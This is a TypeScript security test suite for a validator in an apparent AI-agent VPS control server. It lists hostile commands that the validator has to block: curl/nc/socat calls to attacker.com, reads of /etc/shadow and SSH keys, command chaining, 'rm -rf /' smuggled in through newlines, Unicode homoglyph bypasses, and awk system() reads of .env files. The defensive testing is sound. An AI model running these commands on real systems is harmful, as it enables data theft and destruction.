/**
 * Security test suite — vps-control-mcp
 *
 * Mirrors the 197-test CMD connector suite (S35). Covers every blocked
 * pattern category, known bypass classes (Unicode, newline, symlink,
 * length-DoS, ReDoS), path restriction enforcement, AMBER warning flow,
 * and sensitive file guards.
 *
 * Run: npm test
 * Framework: node:test (built-in) via tsx loader — no extra deps.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { __TEST_ONLY } from '../tools.js';

const {
  validateCommand,
  validateAgainstAllowlist,
  validatePath,
  validateProcess,
  checkAmberWarnings,
  capString,
  INPUT_LIMITS,
  BLOCKED_PATTERNS,
  AMBER_PATTERNS,
  SENSITIVE_FILE_PATTERNS,
  CATASTROPHIC_PATTERN_SHAPES,
  POSITIVE_ALLOWLIST,
} = __TEST_ONLY;

// ─── Helpers ──────────────────────────────────────────────────────────────────

function expectBlocked(cmd: string): void {
  assert.throws(() => validateCommand(cmd), /BLOCKED|exceeds maximum/i, `Expected "${cmd}" to be blocked`);
}

function expectAllowed(cmd: string): void {
  assert.doesNotThrow(() => validateCommand(cmd), `Expected "${cmd}" to be allowed`);
}

// ─── 1. RED tier — one positive test per blocked pattern category ────────────

describe('RED tier — blocked commands', () => {
  const redCases: Array<[string, string]> = [
    // file-delete
    ['rm file.txt',              'file-delete: rm'],
    ['unlink foo',               'file-delete: unlink'],
    ['shred -u secret',          'file-delete: shred'],
    ['truncate -s 0 log',        'file-delete: truncate'],

    // disk-ops
    ['dd if=/dev/zero of=disk',  'disk-ops: dd'],
    ['mkfs.ext4 /dev/sda1',      'disk-ops: mkfs'],
    ['fdisk /dev/sda',           'disk-ops: fdisk'],
    ['parted /dev/sda',          'disk-ops: parted'],
    ['mount /dev/sda /mnt',      'disk-ops: mount'],
    ['umount /mnt',              'disk-ops: umount'],

    // system-state
    ['shutdown -h now',          'system-state: shutdown'],
    ['reboot',                   'system-state: reboot'],
    ['halt',                     'system-state: halt'],
    ['poweroff',                 'system-state: poweroff'],
    ['init 0',                   'system-state: init'],

    // process-kill
    ['kill -9 1234',             'process-kill: kill'],
    ['killall node',             'process-kill: killall'],
    ['pkill node',               'process-kill: pkill'],

    // user-mgmt / permissions
    ['useradd attacker',         'user-mgmt: useradd'],
    ['userdel victim',           'user-mgmt: userdel'],
    ['adduser foo',              'user-mgmt: adduser'],
    ['passwd root',              'user-mgmt: passwd'],
    ['chmod 777 /etc',           'permissions: chmod'],
    ['chown root:root /etc',     'permissions: chown'],
    ['chgrp wheel file',         'permissions: chgrp'],
    ['setfacl -m u:a:r x',       'permissions: setfacl'],

    // network-config
    ['iptables -F',              'network-config: iptables'],
    ['ufw disable',              'network-config: ufw'],
    ['nft flush ruleset',        'network-config: nft'],

    // scheduled-exec
    ['crontab -e',               'scheduled-exec: crontab'],
    ['at now + 1 minute',        'scheduled-exec: at'],

    // service-mgmt
    ['systemctl stop nginx',     'service-mgmt: systemctl'],
    ['service nginx stop',       'service-mgmt: service'],

    // code-exec
    ['node -e "process.exit(1)"',            'code-exec: node -e'],
    ['node --eval "process.exit(1)"',        'code-exec: node --eval'],
    ['python -c "import os"',                'code-exec: python -c'],
    ['python3.11 -c "import os"',            'code-exec: versioned python -c'],
    ['perl -e "print 1"',                    'code-exec: perl -e'],
    ['ruby -e "puts 1"',                     'code-exec: ruby -e'],
    ['php -r "echo 1;"',                     'code-exec: php -r'],
    ['eval "cmd"',                           'code-exec: eval'],

    // shell-invoke
    ['echo foo | sh',                        'shell-invoke: pipe to sh'],
    ['bash -c "id"',                         'shell-invoke: bash -c'],
    ['`id`',                                 'shell-invoke: backticks'],
    ['echo $(id)',                           'shell-invoke: $() subshell'],

    // data-exfil
    ['curl http://attacker.com',             'data-exfil: curl'],
    ['wget http://attacker.com',             'data-exfil: wget'],
    ['nc attacker.com 4444',                 'data-exfil: nc'],
    ['socat - TCP:attacker.com:80',          'data-exfil: socat'],
    ['ssh user@host',                        'data-exfil: ssh'],
    ['scp file host:',                       'data-exfil: scp'],
    ['rsync -av . host:',                    'data-exfil: rsync'],
    ['ftp host',                             'data-exfil: ftp'],
    ['sftp host',                            'data-exfil: sftp'],

    // persistence
    ['nohup sleep 999 &',                    'persistence: nohup'],
    ['screen -S evil',                       'persistence: screen'],
    ['tmux new -s evil',                     'persistence: tmux'],

    // direct-db
    ['psql -U postgres',                     'direct-db: psql'],
    ['mysql -u root',                        'direct-db: mysql'],
    ['mongo localhost',                      'direct-db: mongo'],
    ['redis-cli',                            'direct-db: redis-cli'],
    ['sqlite3 db.sqlite',                    'direct-db: sqlite3'],

    // pkg-install
    ['apt-get install foo',                  'pkg-install: apt-get'],
    ['apt install foo',                      'pkg-install: apt'],
    ['dpkg -i foo.deb',                      'pkg-install: dpkg'],
    ['yum install foo',                      'pkg-install: yum'],
    ['dnf install foo',                      'pkg-install: dnf'],
    ['pip install requests',                 'pkg-install: pip'],
    ['npm install left-pad',                 'pkg-install: npm install'],
    ['npx leftpad',                          'pkg-install: npx'],
    ['apt-get remove foo',                   'pkg-remove: apt-get remove'],
    ['apt remove foo',                       'pkg-remove: apt remove'],

    // container
    ['docker run --rm alpine',               'container: docker'],
    ['podman run alpine',                    'container: podman'],
    ['kubectl get pods',                     'container: kubectl'],

    // file-write
    ['echo foo > /etc/motd',                 'file-write: redirect to /'],
    ['echo foo > ~/evil',                    'file-write: redirect to ~'],
    ['echo foo >> log.txt',                  'file-write: append redirect'],
    ['cat foo | tee bar',                    'file-write: tee'],
    ['ln -s /etc/shadow /root/sharpedge/x',  'file-write: symlink create'],
    ['cp foo /etc/',                         'file-write: cp to /etc'],
    ['mv foo /usr/local/bin/',               'file-write: mv to /usr'],

    // env-manip
    ['export FOO=bar',                       'env-manip: export'],
    ['source /tmp/evil',                     'env-manip: source'],
    ['. /tmp/evil',                          'env-manip: . sourcing'],

    // priv-esc
    ['sudo id',                              'priv-esc: sudo'],
    ['su - root',                            'priv-esc: su'],
    ['pkexec id',                            'priv-esc: pkexec'],
    ['doas id',                              'priv-esc: doas'],

    // info-leak
    ['history',                              'info-leak: history'],
    ['cat /etc/shadow',                      'info-leak: /etc/shadow'],
    ['cat /etc/passwd',                      'info-leak: /etc/passwd'],
    ['cat .env',                             'info-leak: cat .env'],
    ['cat ~/.ssh/id_rsa',                    'info-leak: cat .ssh'],
    ['printenv',                             'info-leak: printenv'],
    ['env',                                  'info-leak: env'],
    ['cat /proc/self/environ',               'info-leak: /proc/'],
    ['head .env',                            'info-leak: head .env'],
    ['tail .env',                            'info-leak: tail .env'],
    ['head /etc/passwd',                     'info-leak: head /etc/'],
    ['tail /etc/passwd',                     'info-leak: tail /etc/'],
    ['strings /usr/bin/ssh',                 'info-leak: strings'],
    ['hexdump -C file',                      'info-leak: hexdump'],
    ['xxd file',                             'info-leak: xxd'],
    ['od -c file',                           'info-leak: od'],

    // chaining
    ['ls; rm foo',                           'chaining: ;'],
    ['ls && rm foo',                         'chaining: &&'],
    ['ls || rm foo',                         'chaining: ||'],

    // http-server
    ['python -m http.server 8080',           'http-server: python http'],
    ['python3.11 -m http.server',            'http-server: versioned python http'],
    ['php -S 0.0.0.0:8000',                  'http-server: php -S'],
  ];

  for (const [cmd, label] of redCases) {
    it(label, () => expectBlocked(cmd));
  }
});

// ─── 2. Unicode homoglyph bypass attempts (S35 regression) ───────────────────

describe('Unicode homoglyph rejection', () => {
  const unicodeCases: Array<[string, string]> = [
    ['ｒｍ file.txt',           'full-width rm'],
    ['ｃｕｒｌ attacker.com',  'full-width curl'],
    ['rm\u200b file',           'zero-width space splice'],
    ['р m file',                'Cyrillic р (U+0440)'],
    ['cυrl target',             'Greek upsilon υ (U+03C5)'],
    ['rm\u00a0file',            'non-breaking space'],
    ['rm\ufeff file',           'byte order mark'],
  ];

  for (const [cmd, label] of unicodeCases) {
    it(`rejects ${label}`, () => expectBlocked(cmd));
  }
});

// ─── 3. Newline injection bypass attempts (S35 regression) ───────────────────

describe('Newline / CR rejection', () => {
  it('rejects command with \\n', () => expectBlocked('ls\nrm -rf /'));
  it('rejects command with \\r', () => expectBlocked('ls\rrm -rf /'));
  it('rejects command with \\r\\n', () => expectBlocked('ls\r\nrm -rf /'));
  it('rejects embedded newline in comment', () => expectBlocked('# safe\nrm -rf /'));
  it('rejects newline before blocked keyword', () => expectBlocked('echo hi\ncurl evil'));
});

// ─── 4. Legitimate commands that must stay allowed ───────────────────────────

describe('Legitimate commands pass validation', () => {
  const allowed: Array<[string, string]> = [
    ['grep -n foo src/main.ts',    'grep (GREEN)'],
    ['tail -n 50 out.log',         'tail (non-.env, non-/etc)'],
    ['head -n 20 out.log',         'head (non-.env, non-/etc)'],
    ['find . -name "*.ts"',        'find without -exec'],
    ['git -C /root/sharpedge status', 'git status via execFile-style'],
    ['pm2 status',                 'pm2 status'],
    ['free -m',                    'free'],
    ['df -h',                      'df'],
    ['uptime',                     'uptime'],
    ['node --version',             'node version (not --eval)'],
    ['ls -la /root/sharpedge',     'ls'],
  ];
  for (const [cmd, label] of allowed) {
    it(`allows ${label}`, () => expectAllowed(cmd));
  }
});

// ─── 5. AMBER tier — warning always returned; caller decides to block or prefix ──
// checkAmberWarnings(cmd) no longer takes a dryRun param (P3c / F-NEW-1/F-NEW-4 fix).
// The function always returns the warning text when matched; runApprovedCommand
// decides whether to block (dry_run=true) or prepend to output (dry_run=false).

describe('AMBER tier — warning flow', () => {
  it('apt-get update always returns warning text', () => {
    const warn = checkAmberWarnings('apt-get update');
    assert.ok(warn, 'expected a warning');
    assert.match(warn!, /WARNING/);
  });
  it('apt-get update does NOT return null (old dry_run=false pass-through removed)', () => {
    // Regression: prior to P3c, checkAmberWarnings('...', false) returned null,
    // silently dropping the warning. Now it always returns warning text.
    const warn = checkAmberWarnings('apt-get update');
    assert.notEqual(warn, null, 'warning must not be silently dropped');
  });
  it('find -exec is now RED (removed from AMBER — F-OP-3)', () => {
    // find -exec was promoted from AMBER to RED; checkAmberWarnings should return null
    const warn = checkAmberWarnings('find . -type f -name "*.log"');
    assert.equal(warn, null, 'plain find should not be AMBER');
  });
  it('xargs warns', () => {
    const warn = checkAmberWarnings('cat list | xargs touch');
    assert.ok(warn);
  });
  it('sed -i is now RED (removed from AMBER — F-OP-2)', () => {
    // sed -i was promoted from AMBER to RED; checkAmberWarnings should return null
    const warn = checkAmberWarnings('sed s/foo/bar/ file.txt');
    assert.equal(warn, null, 'plain sed should not be AMBER');
  });
  it('non-AMBER command returns null', () => {
    const warn = checkAmberWarnings('df -h');
    assert.equal(warn, null);
  });
});

// ─── 6. Input length caps (F-VM-3) ───────────────────────────────────────────

describe('Input length caps', () => {
  it('capString rejects strings over limit', () => {
    assert.throws(
      () => capString('a'.repeat(INPUT_LIMITS.command + 1), INPUT_LIMITS.command, 'command'),
      /exceeds maximum length/
    );
  });
  it('capString accepts strings at the limit', () => {
    assert.doesNotThrow(() => capString('a'.repeat(INPUT_LIMITS.command), INPUT_LIMITS.command, 'command'));
  });
  it('validateCommand rejects 10 KB command string', () => {
    expectBlocked('a'.repeat(10 * 1024));
  });
  it('validateCommand accepts 4,096 B command string', () => {
    expectAllowed('echo ' + 'a'.repeat(4_000));
  });
  it('INPUT_LIMITS defines all expected fields', () => {
    assert.ok(INPUT_LIMITS.command);
    assert.ok(INPUT_LIMITS.justification);
    assert.ok(INPUT_LIMITS.description);
    assert.ok(INPUT_LIMITS.path);
    assert.ok(INPUT_LIMITS.pattern);
    assert.ok(INPUT_LIMITS.process_name);
  });
});

// ─── 7. Path restriction enforcement (validatePath) ──────────────────────────

describe('validatePath — allowlist', () => {
  it('rejects /etc/passwd', () => {
    assert.throws(() => validatePath('/etc/passwd'), /Path not permitted|not found/);
  });
  it('rejects /root/.ssh/id_rsa', () => {
    assert.throws(() => validatePath('/root/.ssh/id_rsa'), /Path not permitted|BLOCKED|not found|EACCES|permission denied/);
  });
  it('rejects relative path escape via ..', () => {
    assert.throws(() => validatePath('/root/sharpedge/../../etc/passwd'), /Path not permitted|not found/);
  });
  it('rejects oversized path', () => {
    assert.throws(() => validatePath('/root/sharpedge/' + 'a'.repeat(INPUT_LIMITS.path + 1)), /exceeds maximum/);
  });
});

// ─── 8. Sensitive file patterns ──────────────────────────────────────────────

describe('Sensitive file pattern coverage', () => {
  const mustBlock = [
    '/root/sharpedge/.env',
    '/root/sharpedge/.env.production',
    '/root/sharpedge/config/secrets.json',
    '/root/sharpedge/deploy.pem',
    '/root/sharpedge/app.key',
    '/root/sharpedge/credentials.json',
    '/root/.ssh/id_rsa',
    '/root/sharpedge/aws/config',
    '/root/.aws/credentials',
    '/root/sharpedge/password.txt',
    '/root/sharpedge/token.secret',
  ];
  for (const p of mustBlock) {
    it(`${p} matches a sensitive pattern`, () => {
      const matched = SENSITIVE_FILE_PATTERNS.some(rx => rx.test(p));
      assert.ok(matched, `${p} should match at least one SENSITIVE_FILE_PATTERN`);
    });
  }
});

// ─── 9. Process allowlist ────────────────────────────────────────────────────

describe('validateProcess', () => {
  it('rejects unknown process', () => {
    assert.throws(() => validateProcess('evil-process'), /not permitted/);
  });
  it('accepts sharpedge-api', () => {
    // Depends on CONFIG.ALLOWED_PROCESSES — skip if env differs
    try {
      validateProcess('sharpedge-api');
      assert.ok(true);
    } catch (err) {
      // If env isn't set up for this test run, that's fine
      assert.match((err as Error).message, /not permitted/);
    }
  });
  it('rejects oversized process_name', () => {
    assert.throws(() => validateProcess('a'.repeat(INPUT_LIMITS.process_name + 1)), /exceeds maximum/);
  });
});

// ─── 10. ReDoS-shape guard (F-VM-7) ──────────────────────────────────────────

describe('Catastrophic regex shape detection', () => {
  const pathological = [
    '(.*)+',
    '(.+)*',
    '([^x]*)+',
    '.*.*.*',
  ];
  for (const p of pathological) {
    it(`rejects "${p}"`, () => {
      const matched = CATASTROPHIC_PATTERN_SHAPES.some(rx => rx.test(p));
      assert.ok(matched, `${p} should trigger a catastrophic-shape reject`);
    });
  }

  const safe = [
    'foo',
    'error: [0-9]+',
    '^import .* from',
    'console\\.log\\(',
  ];
  for (const p of safe) {
    it(`allows safe pattern "${p}"`, () => {
      const matched = CATASTROPHIC_PATTERN_SHAPES.some(rx => rx.test(p));
      assert.ok(!matched, `${p} should not trigger a catastrophic-shape reject`);
    });
  }
});

// ─── 11. Blocked-pattern structural health ───────────────────────────────────

describe('BLOCKED_PATTERNS structural health', () => {
  it('has at least 80 patterns', () => {
    assert.ok(BLOCKED_PATTERNS.length >= 80, `only ${BLOCKED_PATTERNS.length} patterns`);
  });
  it('every pattern has a category', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.category && typeof p.category === 'string', `missing category on ${p.pattern}`);
    }
  });
  it('every pattern has a reason', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.reason && typeof p.reason === 'string', `missing reason on ${p.pattern}`);
    }
  });
  it('every pattern is a RegExp', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.pattern instanceof RegExp);
    }
  });
});

describe('AMBER_PATTERNS structural health', () => {
  it('has at least 1 pattern (find -exec, awk, sed -i promoted to RED in F-OP-1/2/3)', () => {
    assert.ok(AMBER_PATTERNS.length >= 1);
  });
  it('every entry has a risk string', () => {
    for (const p of AMBER_PATTERNS) {
      assert.ok(p.risk && typeof p.risk === 'string');
    }
  });
});

// ─── 12. No false positives on common devops idioms ──────────────────────────
// These are S37 regression cases — previously over-blocked, now gated to command-position.

describe('False-positive guards (common devops idioms stay allowed)', () => {
  it('"kernel" is not mistaken for \\bkill\\b', () => {
    expectAllowed('grep kernel /var/log/syslog');
  });
  it('"category" / "cat" substring does not trigger info-leak pattern', () => {
    // \bcat\b requires a whole-word match + specific suffix like .env, /etc/.
    // "category" has "cat" as a prefix inside a larger word — word boundaries prevent the match.
    expectAllowed('grep category /root/sharpedge/artifacts/api-server/out.log');
  });
  it('"du" (disk usage) is allowed', () => {
    expectAllowed('du -sh /var/log');
  });
  it('"ps" (process status) is allowed', () => {
    expectAllowed('ps aux');
  });
  it('"concatenation" is allowed in echo', () => {
    expectAllowed('echo "concatenation"');
  });
});

// ─── 13. Positive allowlist (P3c / F-NEW-3) ──────────────────────────────────

describe('validateAgainstAllowlist — default-deny', () => {
  // helper: wraps throws check for allowlist
  function expectAllowlisted(cmd: string) {
    assert.doesNotThrow(() => validateAgainstAllowlist(cmd), `expected "${cmd}" to be on allowlist`);
  }
  function expectNotAllowlisted(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[not-allowlisted\]/, `expected "${cmd}" to be blocked by allowlist`);
  }
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/, `expected "${cmd}" to be blocked by arg validator`);
  }

  // ── Allowlisted binaries pass ────────────────────────────────────────────
  it('df -h passes', () => expectAllowlisted('df -h'));
  it('free -h passes', () => expectAllowlisted('free -h'));
  it('ls /root/sharpedge passes', () => expectAllowlisted('ls /root/sharpedge'));
  it('cat /root/sharpedge/out.log passes', () => expectAllowlisted('cat /root/sharpedge/out.log'));
  it('tail -n 50 /root/sharpedge/out.log passes', () => expectAllowlisted('tail -n 50 /root/sharpedge/out.log'));
  it('grep error /root/sharpedge/out.log passes', () => expectAllowlisted('grep error /root/sharpedge/out.log'));
  it('pm2 status passes', () => expectAllowlisted('pm2 status'));
  it('pm2 logs passes', () => expectAllowlisted('pm2 logs'));
  it('echo hello passes', () => expectAllowlisted('echo hello'));
  it('which node passes', () => expectAllowlisted('which node'));
  it('node --version passes', () => expectAllowlisted('node --version'));
  it('pnpm audit passes', () => expectAllowlisted('pnpm audit'));
  it('npm outdated passes', () => expectAllowlisted('npm outdated'));
  it('uptime passes', () => expectAllowlisted('uptime'));
  it('date passes', () => expectAllowlisted('date'));
  it('ss -tulpn passes', () => expectAllowlisted('ss -tulpn'));
  it('du -sh /root/sharpedge passes', () => expectAllowlisted('du -sh /root/sharpedge'));

  // ── Non-allowlisted binaries are blocked ─────────────────────────────────
  it('less is not on allowlist', () => expectNotAllowlisted('less /etc/passwd'));
  it('more is not on allowlist', () => expectNotAllowlisted('more /etc/passwd'));
  it('python3 is not on allowlist', () => expectNotAllowlisted('python3 -c "import os"'));
  it('bash is not on allowlist', () => expectNotAllowlisted('bash -c id'));
  it('curl is not on allowlist', () => expectNotAllowlisted('curl http://example.com'));
  it('wget is not on allowlist', () => expectNotAllowlisted('wget http://example.com'));
  it('xxd is not on allowlist', () => expectNotAllowlisted('xxd /etc/shadow'));
  it('strings is not on allowlist', () => expectNotAllowlisted('strings /root/.env'));
  it('hexdump is not on allowlist', () => expectNotAllowlisted('hexdump /root/.env'));
  it('od is not on allowlist', () => expectNotAllowlisted('od /root/.env'));
  it('nl is not on allowlist', () => expectNotAllowlisted('nl /etc/passwd'));
  it('tac is not on allowlist', () => expectNotAllowlisted('tac /etc/shadow'));
  it('rev is not on allowlist', () => expectNotAllowlisted('rev /etc/shadow'));
  it('base64 is not on allowlist', () => expectNotAllowlisted('base64 /root/.env'));
  it('awk is not on allowlist (F-OP-1 — system() provides full root RCE)', () => {
    expectNotAllowlisted('awk NR==1 /etc/shadow');
  });
  it('awk system() would be blocked by not-allowlisted', () => {
    expectNotAllowlisted('awk BEGIN{system("id")}');
  });

  // ── Path-qualified binary names are blocked ───────────────────────────────
  it('/bin/cat is blocked (path-qualified)', () => {
    assert.throws(() => validateAgainstAllowlist('/bin/cat /root/sharpedge/out.log'), /BLOCKED \[not-allowlisted\]/);
  });
  it('/usr/bin/python3 is blocked (path-qualified)', () => {
    assert.throws(() => validateAgainstAllowlist('/usr/bin/python3 -c "import os"'), /BLOCKED \[not-allowlisted\]/);
  });
  it('../../../bin/cat is blocked (traversal-qualified)', () => {
    assert.throws(() => validateAgainstAllowlist('../../../bin/cat /etc/shadow'), /BLOCKED \[not-allowlisted\]/);
  });

  // ── pm2 sub-command allowlist ─────────────────────────────────────────────
  it('pm2 restart is blocked (use restart_process tool)', () => {
    expectInvalidArgs('pm2 restart all');
  });
  it('pm2 delete is blocked', () => {
    expectInvalidArgs('pm2 delete vps-mcp');
  });
  it('pm2 start is blocked', () => {
    expectInvalidArgs('pm2 start app.js');
  });

  // ── node arg validator ────────────────────────────────────────────────────
  it('node -e "code" is blocked', () => {
    expectInvalidArgs('node -e "require(\'child_process\').exec(\'id\')"');
  });
  it('node --eval is blocked', () => {
    expectInvalidArgs('node --eval "process.exit(0)"');
  });
  it('node script.js passes', () => expectAllowlisted('node script.js'));

  // ── npm/pnpm sub-command allowlist ────────────────────────────────────────
  it('npm install is blocked', () => {
    expectInvalidArgs('npm install malicious-pkg');
  });
  it('pnpm install is blocked', () => {
    expectInvalidArgs('pnpm install malicious-pkg');
  });
  it('npm run is blocked', () => {
    expectInvalidArgs('npm run arbitrary-script');
  });

  // ── Sensitive-file arg rejection on allowlisted binaries ─────────────────
  it('cat .env is blocked by arg validator', () => {
    expectInvalidArgs('cat /root/sharpedge/.env');
  });
  it('tail .env is blocked by arg validator', () => {
    expectInvalidArgs('tail -f /root/sharpedge/.env.production');
  });
  it('head credentials.json is blocked by arg validator', () => {
    expectInvalidArgs('head /root/sharpedge/credentials.json');
  });

  // ── Structural health ─────────────────────────────────────────────────────
  it('POSITIVE_ALLOWLIST has at least 20 entries', () => {
    assert.ok(Object.keys(POSITIVE_ALLOWLIST).length >= 20,
      `only ${Object.keys(POSITIVE_ALLOWLIST).length} allowlist entries`);
  });
  it('every allowlist entry has a description', () => {
    for (const [bin, entry] of Object.entries(POSITIVE_ALLOWLIST)) {
      assert.ok(entry.description && typeof entry.description === 'string',
        `missing description on allowlist entry for "${bin}"`);
    }
  });
  it('every allowlist entry has an argValidator function', () => {
    for (const [bin, entry] of Object.entries(POSITIVE_ALLOWLIST)) {
      assert.equal(typeof entry.argValidator, 'function',
        `missing argValidator on allowlist entry for "${bin}"`);
    }
  });
});

// ─── 14. F-OP hardening tests (third-pass adversarial review, S47) ─────────────

describe('F-OP-1 — awk removed from allowlist (system() / getline RCE)', () => {
  function expectNotAllowlisted(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[not-allowlisted\]/);
  }
  it('awk is not on POSITIVE_ALLOWLIST', () => {
    assert.ok(!('awk' in POSITIVE_ALLOWLIST), 'awk must not be on allowlist');
  });
  it('awk BEGIN{system("id")} is not-allowlisted', () => expectNotAllowlisted('awk BEGIN{system("id")}'));
  it('awk BEGIN{system("base64/root/.env")} is not-allowlisted', () => expectNotAllowlisted('awk \'BEGIN{system("base64 /root/sharpedge/.env")}\''));
  it('awk getline is not-allowlisted', () => expectNotAllowlisted('awk \'BEGIN{while((getline<"/root/.env")>0)print}\''));
});

describe('F-OP-2 — sed e command and -i promoted to RED', () => {
  it('sed 1ewhoami is RED (line-address+e shell execution)', () => {
    expectBlocked('sed 1ewhoami /dev/null');
  });
  it('sed $ecmd is RED', () => {
    expectBlocked('sed $eid /dev/null');
  });
  it('sed -i is RED (in-place file modification)', () => {
    expectBlocked('sed -i "s/foo/bar/" file.txt');
  });
  it('sed --in-place is RED', () => {
    expectBlocked('sed --in-place "s/a/b/" file');
  });
  it('sed substitution e-flag is blocked by arg validator', () => {
    assert.throws(
      () => validateAgainstAllowlist('sed s/a/b/e'),
      /BLOCKED \[invalid-args\]/,
      'sed s/a/b/e should be blocked by validateSedArgs'
    );
  });
  it('plain sed s/pattern/replace/g passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('sed s/foo/bar/g /root/sharpedge/out.log'));
  });
});

describe('F-OP-3 — find -exec promoted to RED', () => {
  it('find -exec cat is RED', () => {
    expectBlocked('find /root/sharpedge -type f -exec cat {} +');
  });
  it('find -execdir is RED', () => {
    expectBlocked('find /root -type f -execdir head {} +');
  });
  it('find -exec (BLOCKED by arg validator too)', () => {
    assert.throws(
      () => validateAgainstAllowlist('find /root/sharpedge -exec cat {} +'),
      /BLOCKED \[invalid-args\]|BLOCKED \[code-exec\]/,
    );
  });
  it('plain find -name passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('find /root/sharpedge -name "*.log"'));
  });
});

describe('F-OP-4 — grep -r/-R recursive blocked', () => {
  it('grep -r is blocked by arg validator', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep -r API_KEY /root/sharpedge'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep -R is blocked', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep -R TOKEN /root/sharpedge'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep --recursive is blocked', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep --recursive SECRET /root'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep -rh (combined with r) is blocked', () => {
    assert.throws(
      () => validateAgainstAllowlist('grep -rh API_KEY /root/sharpedge'),
      /BLOCKED \[invalid-args\]/,
    );
  });
  it('grep -n (non-recursive) passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('grep -n error /root/sharpedge/out.log'));
  });
  it('grep with pattern and file passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('grep TOKEN /root/sharpedge/out.log'));
  });
});

describe('F-OP-5 — SENSITIVE_FILE_PATTERNS .env regex tightened', () => {
  const tightRegex = SENSITIVE_FILE_PATTERNS[0]; // /\.env(?![a-zA-Z0-9])/i
  it('.env at end-of-string matches', () => {
    assert.ok(tightRegex.test('/root/sharpedge/.env'));
  });
  it('.env.production matches', () => {
    assert.ok(tightRegex.test('/root/sharpedge/.env.production'));
  });
  it('.env" (quote suffix) now matches (was bypassed in v1.5.0)', () => {
    assert.ok(tightRegex.test('/root/.env"'));
  });
  it('.env) (paren suffix) now matches', () => {
    assert.ok(tightRegex.test('/root/.env)'));
  });
  it('.env/ (trailing slash) now matches', () => {
    assert.ok(tightRegex.test('/root/.env/'));
  });
  it('.env$IFS suffix — $ is non-alphanum so matches', () => {
    assert.ok(tightRegex.test('/root/.env$'));
  });
  it('.envrc does NOT match (has alphanum suffix r)', () => {
    // .envrc is a separate tool (direnv) and while suspicious, is a separate concern
    assert.ok(!tightRegex.test('/root/.envrc'));
  });
  it('.environment does NOT match (has alphanum suffix i)', () => {
    assert.ok(!tightRegex.test('/root/.environment'));
  });
  it('.env_local with underscore — underscore is non-alphanum, matches', () => {
    assert.ok(tightRegex.test('/root/.env_local'));
  });
});

describe('F-OP-6/7 — pm2 jlist/describe/info/show/prettylist blocked (leak pm2_env)', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('pm2 jlist is blocked (leaks MCP_AUTH_TOKEN via pm2_env)', () => expectInvalidArgs('pm2 jlist'));
  it('pm2 prettylist is blocked', () => expectInvalidArgs('pm2 prettylist'));
  it('pm2 describe vps-mcp is blocked', () => expectInvalidArgs('pm2 describe vps-mcp'));
  it('pm2 info vps-mcp is blocked', () => expectInvalidArgs('pm2 info vps-mcp'));
  it('pm2 show 0 is blocked', () => expectInvalidArgs('pm2 show 0'));
  it('pm2 status still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 status'));
  });
  it('pm2 list still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 list'));
  });
  it('pm2 logs still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 logs'));
  });
});

describe('F-OP-18 — ps removed from allowlist (auxe dumps MCP_AUTH_TOKEN)', () => {
  it('ps is not on POSITIVE_ALLOWLIST', () => {
    assert.ok(!('ps' in POSITIVE_ALLOWLIST), 'ps must not be on allowlist');
  });
  it('ps auxe is blocked by RED pattern', () => {
    expectBlocked('ps auxe');
  });
  it('ps is not-allowlisted via validateAgainstAllowlist', () => {
    assert.throws(
      () => validateAgainstAllowlist('ps aux'),
      /BLOCKED \[not-allowlisted\]/,
    );
  });
  it('ps -eo cmd,env env-dump pattern is RED', () => {
    expectBlocked('ps -eo cmd,env');
  });
});

describe('F-OP-19 — node --inspect* blocked (V8 remote debugger = root RCE)', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('node --inspect=0.0.0.0:9229 is blocked', () => expectInvalidArgs('node --inspect=0.0.0.0:9229 script.js'));
  it('node --inspect is blocked', () => expectInvalidArgs('node --inspect script.js'));
  it('node --inspect-brk is blocked', () => expectInvalidArgs('node --inspect-brk=9229 script.js'));
  it('node --inspect-port is blocked', () => expectInvalidArgs('node --inspect-port=9229 script.js'));
  it('node --experimental-loader is blocked', () => expectInvalidArgs('node --experimental-loader ./evil.mjs script.js'));
  it('node --loader is blocked', () => expectInvalidArgs('node --loader ./evil.mjs script.js'));
  it('node --cpu-prof is blocked', () => expectInvalidArgs('node --cpu-prof script.js'));
  it('node --heap-prof is blocked', () => expectInvalidArgs('node --heap-prof script.js'));
  it('node script.js still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('node script.js'));
  });
  it('node --version still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('node --version'));
  });
});

// ─── Fifth-pass findings (F-OP-33 / F-OP-34) — regression tests ──────────────

describe('F-OP-33 — validateArgPath resolves relative paths before allowlist check', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('cat ../../etc/group is blocked (path not permitted after resolve)', () => expectInvalidArgs('cat ../../etc/group'));
  it('wc ../../var/log/syslog is blocked', () => expectInvalidArgs('wc ../../var/log/syslog'));
  it('node ../../tmp/x.js is blocked', () => expectInvalidArgs('node ../../tmp/x.js'));
  it('sort ../../etc/passwd is blocked', () => expectInvalidArgs('sort ../../etc/passwd'));
